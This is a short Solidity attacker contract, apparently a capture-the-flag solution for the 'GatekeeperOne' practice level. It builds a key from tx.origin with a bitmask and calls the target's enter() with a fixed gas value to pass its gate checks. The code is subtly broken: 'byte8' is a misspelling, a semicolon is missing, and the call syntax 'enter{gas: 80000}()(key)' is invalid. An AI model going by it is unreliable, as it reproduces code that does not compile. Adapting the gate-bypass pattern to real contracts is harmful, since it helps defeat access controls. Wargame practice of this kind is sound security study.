// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './GatekeeperOne.sol';

contract GatekeeperOneAttack {
    GatekeeperOne public target;

    constructor(address _gatekeeperOneAddr) public {
        target = GatekeeperOne(_gatekeeperOneAddr);
    }

    function attack() public {
        bytes8 key = byte8(tx.origin) & 0xffffffff0000ffff
        target.enter{gas: 80000}()(key);
    }
}